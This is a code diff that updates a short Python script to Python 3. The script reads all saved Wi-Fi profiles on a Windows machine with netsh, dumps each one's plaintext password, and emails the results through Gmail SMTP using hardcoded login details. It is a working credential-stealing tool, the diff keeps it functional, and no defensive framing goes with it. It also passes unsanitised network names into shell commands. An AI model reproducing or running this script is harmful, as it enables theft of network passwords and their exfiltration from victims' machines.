@@ -1,6 +1,8 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
-import subprocess, smtplib, re
+import subprocess
+import smtplib
+import re
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -10,13 +12,14 @@ def send_mail(email, password, message):
     server.quit()
 
 command = "netsh wlan show profile"
-networks = subprocess.check_output(command, shell=True)
-networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+networks = subprocess.check_output(command, shell=True, universal_newlines=True)
+
+networks_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)
 
 result = ""
 for network_name in networks_names_list:
-    command = "netsh wlan show profile " + network_name + " key=clear"
-    current_result = subprocess.check_output(command, shell=True)
-    result = result + current_result
+    command = f"netsh wlan show profile {network_name} key=clear"
+    current_result = subprocess.check_output(command, shell=True, universal_newlines=True)
+    result += current_result
 
 send_mail("john@gmail.com", "abc123", result)
